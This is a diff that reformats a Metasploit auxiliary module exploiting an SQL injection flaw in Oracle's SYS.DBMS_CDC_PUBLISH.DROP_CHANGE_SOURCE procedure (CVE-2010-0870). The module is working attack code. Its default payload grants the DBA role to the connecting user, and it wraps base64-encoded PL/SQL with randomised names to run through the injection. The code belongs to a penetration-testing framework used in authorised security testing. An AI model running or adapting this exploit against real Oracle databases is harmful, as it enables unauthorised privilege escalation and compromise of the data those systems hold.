@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,36 +7,36 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::ORACLE
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE',
-      'Description'    => %q{
-        The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE
-        procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
-        on the vulnerable package can exploit this vulnerability. By default, users granted
-        EXECUTE_CATALOG_ROLE have the required privilege.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2010-0870' ],
-          [ 'OSVDB', '63772'],
-          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2010.html' ]
-        ],
-      'DisclosureDate' => 'Apr 26 2010'))
+                      'Name'           => 'Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE',
+                      'Description'    => %q(
+                        The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE
+                        procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege
+                        on the vulnerable package can exploit this vulnerability. By default, users granted
+                        EXECUTE_CATALOG_ROLE have the required privilege.
+                      ),
+                      'Author'         => [ 'MC' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2010-0870' ],
+                          [ 'OSVDB', '63772'],
+                          [ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpuapr2010.html' ]
+                        ],
+                      'DisclosureDate' => 'Apr 26 2010'))
 
-      register_options(
-        [
-          OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"]),
-        ], self.class)
+    register_options(
+      [
+        OptString.new('SQL', [ false, 'SQL to execute.', "GRANT DBA TO #{datastore['DBUSER']}"])
+      ], self.class
+    )
   end
 
   def run
-    return if not check_dependencies
+    return unless check_dependencies
 
     name  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
     var1  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
@@ -62,7 +63,7 @@ END;
     uno  = Rex::Text.encode_base64(function)
     dos  = Rex::Text.encode_base64(package)
 
-    encoded_sql = %Q|
+    encoded_sql = %|
 DECLARE
 #{var1} VARCHAR2(32767);
 #{var2} VARCHAR2(32767);
@@ -77,7 +78,5 @@ END;
     print_status("Attempting sql injection on SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE...")
     prepare_exec(encoded_sql)
     print_status("Done...")
-
   end
-
 end
